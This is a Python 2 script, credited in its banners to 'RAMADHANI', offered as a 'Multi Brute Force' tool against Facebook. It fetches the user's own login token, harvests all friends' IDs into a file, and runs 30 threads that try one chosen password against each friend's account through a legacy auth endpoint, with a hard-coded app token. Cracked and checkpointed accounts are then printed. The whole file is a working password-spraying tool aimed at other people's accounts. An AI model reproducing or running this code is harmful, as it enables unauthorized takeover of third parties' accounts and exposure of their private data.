# Created by RAMADHANI
# Tools Multi Brute Force Facebook Ringan
#=============================================
# J A N G A N   D I   R E C O D E.  N J I N G 
#=============================================

import os 
import sys
import time
import json
import urllib
import threading
import requests

d = "\033[90;1m"
m = "\033[91;1m"
h = "\033[92;1m"
k = "\033[93;1m"
b = "\033[94;1m"
p = "\033[95;1m"
a = "\033[96;1m"
pu = "\033[97;1m"

count = 0
dados1 = []
gagal = []
oradadi = []
threads = []
id_konco = []

def ival(nob):
    color = {'d':90, 'm':91, 'h':92, 'k':93, 'b':94, 'p':95, 'a':96, 'w':97}
    for iv in color:
        nob = nob.replace('\r%s'%iv, '\033[%s;1m'%color[iv])
    nob += '\033[0m'
    nob = nob.replace('\r0', '\033[0m')
    print nob

def run(noob):
    for i in noob + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(10. / 1000)

def clear():
    os.system("clear")

def banner():
    clear()
    ival ('''\ra
               
          __  __    _    ____
         |  \/  |  / \  |  _ \  \rw
         | |\/| | / _ \ | |_) |   \rp  
         | |  | |/ ___ \|  _ <  
         \033[32;1m|_|  |_/_/   \_\_| \_\ \033[31;1mV 1.1              
     \033[33;1m================================
     \ra=       MULTI BRUTE FORCE      =
     \rw================================
     \rp= Recode by :\ra RAMADHANI\rp        =
     \rp= YT        :\ra M ALFIKRI R\rp      =
     \r     ================================''')

def logout():
    
    try:
        print k+" ["+pu+"1"+k+"]"+a+" Keluar Dari Program.."
        print k+" ["+pu+"2"+k+"]"+a+" Keluar Dari Akun Facebook.."
        iqbal = raw_input(p+" [?]"+h+" Pilih Salah Satu.. "+a+"["+pu+" 1 / 2"+a+" ]\033[97m: ")
        if iqbal == "1":
            print d+" Keluar Dari Program.."
        elif iqbal == "2":
            print k+ " Keluar Dari Akun Fb..."
            print h+ " Anda Harus Login Fb Lagi.."
            os.system("rm -f token.txt") 
        else:
            print m+ "Pilih yg Bener Cuk.."
            logout()
            
    except KeyboardInterrupt:
        sys.exit()

def login():
    
    try:
        token = open("token.txt", "r")
        mbf()
        sel()
        
    except IOError, KeyError:
        
        banner()
        user_name = raw_input(p+"  ["+h+"#"+p+"]" + a + " User Name " + pu + " : ")
        password = raw_input(p+"  ["+h+"#"+p+"]" + a + " Pasword " + d + "   : ")
        req = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_name+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    
        dev = req.content
        jsl = json.loads(dev)
        if "session_key" in dev:
            print
            run (h+" Berhasil Login\033[97m........")
            open("token.txt", "w").write(jsl["access_token"])
            run (h+" Login Sukses\033[97m........")
            print
            id_teman()
        elif "www.facebook.com" in jsl["error_msg"]:
            print 
            print k+" Akun Kena Cekpoint.." 
            print
            sys.exit()

        else:
            print
            print m+ "LogIn Gagal.....!"
            print
            sys.exit()

    except KeyboardInterrupt:
        print
        print d+" Exit/Keluar Tools."


def id_teman():
    try:
        token = open("token.txt", "r").read()
    except IOError:
        print m+ " Token Tidak Ada..."
        os.system('rm -f token.txt')

    else:
        try:
            req = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)            
            jsl = json.loads(req.text)
            simpan_id = open("id.txt", "w")
            for ival in jsl['data']:
                id_konco.append(ival['id'])
                simpan_id.write(ival['id'] + "\n")
                data_id = open("id.txt", 'r').read().split()
                sys.stdout.write("\r \033[95m [$]\033[92m Mengambil ID Teman \033[97m=> " + str(len(data_id)))
                sys.stdout.flush()
            simpan_id.close()
            print
            print a+"\n  ID Tersimpan " + p + "(" + pu + "id.txt" + p + ")" 
            print 
            iqbal = requests.get("https://graph.facebook.com/me?access_token=" + token)
            dev = json.loads(iqbal.text)
            nama = dev["name"]
            print (h+" [ "+p+"Lanjutkan " + pu + nama +h+" ]\n")
            raw_input(k+ " => ")
            
        except IOError:
            print m+" Kesalahan Tidak Diketauhi..."


def mbf():

    global password
    global listID, nama

    try:
        token = open("token.txt", "r")
    except IOError:
        print
        print m+" Token Tidak Ada"
        os.system("rm -f token.txt")
        login()
    else:
    
        print
        banner()
        try:
            token = open("token.txt", "r").read()
            iqbal_name = requests.get("https://graph.facebook.com/me?access_token=" + token)
            dev = json.loads(iqbal_name.text)
            nama = dev['name']
            print h+"  []" + a + " Wellcome Asu " + pu + nama + "\033[92m :)"
            print d+"  ======================================"
            password = raw_input(h+"  [" +k+ "MBF" +h+ "]" + a + " Cracking Password" + p + ": ")
            if password == "":
                print m+" Jangan Kosong Cuk.."
                sys.exit()
                
            if password == " ":
                print m+" Jangan Kosong Cuk.."
                sys.exit()
                
            print
            try:
                listID = open('id.txt', "r")
                for ival in range(30):
                    iqbal = threading.Thread(target=iqbaldevmbf, args=())
                    iqbal.start()
                    threads.append(iqbal)

                for ipal in threads:
                    ipal.join()

            except IOError:
                print
                print m+" Tidak Ada File Yang Ditemukan.."

        except KeyboardInterrupt:
            print
            print d+ " Keluar Dari Program"
            sys.exit()
        
        except KeyError: 
            print
            print m+" Terjadi Error Mungkin Akun Kena Cekpoint"
            os.system("rm -f token.txt")
            print
            
def iqbaldevmbf():
    
    global count, dados1, gagal, oradadi, baris
    
    try:
        data_lis = open('id.txt', "r")
        baris = data_lis.read().split()
        while listID:
            user = listID.readline().strip()
            url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + password + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
            Iq_data = urllib.urlopen(url)
            jsl = json.load(Iq_data)
            if count == len(baris):
                break
                
            elif "access_token" in jsl:
                dados1.append(h+" [OK] " + pu + user + " | " + a + password)
                count += 1
                
           
            elif "www.facebook.com" in jsl["error_msg"]:
                gagal.append(m+" [CP] " + d + user + " | " + m + password)
                count += 1
                
            else:
                oradadi.append(user)
                count += 1
        
            sys.stdout.write(pu+ "\r [$]" + a + " Cracking " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " [ " + h + str(len(dados1)) + pu + " / " + k + str(len(gagal)) + m + " ]")
            sys.stdout.flush()
            
        
    except IOError:
        print
        print m+" Gangguan koneksi.."

       
def sel():
    print 
    print 
    for iqbal in dados1:
        print iqbal
    for dev in gagal:
        print dev
    print

    print m+ " Bosok => " + str(len(oradadi))
    print
    logout()
    sys.exit()
        
def main():
    login()
    mbf()
    sel()
    
if __name__=="__main__":
    main()


